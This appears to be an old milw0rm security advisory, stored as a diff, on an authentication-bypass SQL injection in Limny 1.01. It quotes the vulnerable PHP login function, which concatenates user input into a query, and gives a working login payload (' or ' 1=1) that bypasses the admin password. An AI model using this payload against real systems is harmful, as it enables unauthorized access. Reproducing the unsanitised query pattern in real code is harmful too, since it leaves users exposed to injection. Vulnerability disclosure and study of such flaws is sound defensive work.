@@ -1,0 +1,42 @@
+###########################################################################################
+[+] Limny 1.01 (Auth Bypass) SQL Injection Vulnerability
+[+] Discovered By SirGod
+[+] http://insecurity-ro.org
+[+] http://h4cky0u.org
+############################################################################################
+
+[+] Script Homepage : http://www.limny-project.com/
+
+[+] SQL Injection Vulnerability
+
+ - Notes : magic_quotes_gpc = off
+
+ - Vulnerable code in includes/functions.php
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+function CheckLogin($username, $password)
+{
+	global $db;
+	$query = $db->query("SELECT user, pass FROM ".TABLE_PREFIX."users
+WHERE user='$username' AND pass='$password'");
+	if($check = $db->fetch_array($query))
+	{
+		return true;
+	}else{
+		return false;
+	}
+}
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+ - PoC
+
+   Username : [REAL-ADMIN-NAME] ' or ' 1=1
+   Password : anything
+
+[REAL-ADMIN-NAME] = usually is admin
+
+############################################################################################
+
+# milw0rm.com [2009-07-27]
